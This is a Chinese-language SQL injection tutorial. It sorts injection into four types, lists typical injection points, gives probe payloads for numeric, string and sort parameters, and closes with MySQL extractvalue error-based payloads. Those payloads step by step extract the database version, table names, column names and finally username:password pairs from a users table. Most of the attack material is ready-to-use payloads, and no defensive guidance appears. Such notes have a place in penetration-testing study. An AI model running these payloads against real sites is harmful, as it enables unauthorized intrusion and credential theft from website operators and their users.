概括：用户输入被直接拼进 SQL 语句，攻击者通过精心构造的输入"劫持"了 SQL 的语法结构，让数据库执行非预期的查询——读取、修改甚至删除数据。
# 一、4种注入类型 
SQL注入按"数据能不能直接回显到页面上"分为4类，难度递增：

| 类型                     | 回显方式                 | 难度  | 典型场景          |
| ---------------------- | -------------------- | --- | ------------- |
| 报错注入（Error-based）      | 数据库报错信息直接显示在页面上      | 简单  | 搜索页报错、调试模式未关  |
| 联合查询注入（UNION-based）    | 查询结果直接回显在页面上         | 简单  | 列表页、详情页有数据展示区 |
| 布尔盲注（Boolean Blind）    | 页面不显示数据，但"对/错"返回不同内容 | 中等  | 登录页、搜索结果有无    |
| 时间盲注（Time-based Blind） | 页面无任何差异，只能靠响应时间判断    | 困难  | 无回显、无报错的接口    |

**选择策略**
有回显 → UNION/报错注入（快、准）
无回显但有差异 → 布尔盲注（慢但稳）
完全无差异 → 时间盲注（最慢，最后的手段）
# 二、注入点探测
## 第一步：判断注入点类型
任何用户可控、会进入 SQL 查询的参数都是潜在注入点：

| 位置      | 示例               | 常见参数名                       |
| ------- | ---------------- | --------------------------- |
| URL 参数  | `?id=1`          | id, uid, cid, article_id    |
| 搜索参数    | `?q=hello`       | q, keyword, search, name    |
| 排序参数    | `?sort=price`    | sort, order, orderby, field |
| POST 表单 | `username=admin` | 登录框、注册框                     |
| HTTP 头  | X-Forwarded-For  | UA, Referer, Cookie, XFF    |

### 探针payload
```
# ⭐ 数字型参数探测（id=1 这种）
?id=1'           # 加单引号，看是否报错
?id=1 AND 1=1    # 返回正常
?id=1 AND 1=2    # 返回异常（无数据）→ 确认数字型注入

# ⭐ 字符型参数探测（搜索框这种）
?q=hello'        # 加单引号看报错
?q=hello' AND '1'='1   # 返回正常
?q=hello' AND '1'='2   # 返回异常 → 确认字符型注入

# ⭐ 排序参数探测（不能加引号，直接测试）
?sort=price,(select sleep(3))   # 延迟 3 秒 → 时间盲注
?sort=price ASC--               # 改变排序方向 → 确认可注入
```

### 数字型 vs 字符型的区别

|         | 数字型          | 字符型                  |
| ------- | ------------ | -------------------- |
| SQL写法   | `WHERE id=1` | `WHERE name='hello'` |
| 需要闭合引号？ | 不需要          | 需要先加 `'` 闭合          |
| 注释方式    | 不需要          | `--` 或 `#` 注释掉尾部引号   |

# 三、报错注入（Error-based）
报错注入实战
原理：故意触发数据库错误，让报错信息中携带你想查的数据
```
# ⭐MySQL 经典报错函数：extractvalue / updatexml
# 利用 extractvalue 报错，把 version() 塞进报错信息
?id=1 AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e))
# 报错信息：XPATH syntax error: '~5.7.32~'

# ⭐查当前数据库名
?id=1 AND extractvalue(1, concat(0x7e, database(), 0x7e))

# ⭐查表名（从 information_schema 拉）
?id=1 AND extractvalue(1, concat(0x7e,
  (SELECT group_concat(table_name) FROM information_schema.tables
   WHERE table_schema=database()), 0x7e))

# ⭐查列名
?id=1 AND extractvalue(1, concat(0x7e,
  (SELECT group_concat(column_name) FROM information_schema.columns
   WHERE table_name='users'), 0x7e))

# ⭐查数据
?id=1 AND extractvalue(1, concat(0x7e,
  (SELECT concat(username,0x3a,password) FROM users LIMIT 0,1), 0x7e))
```
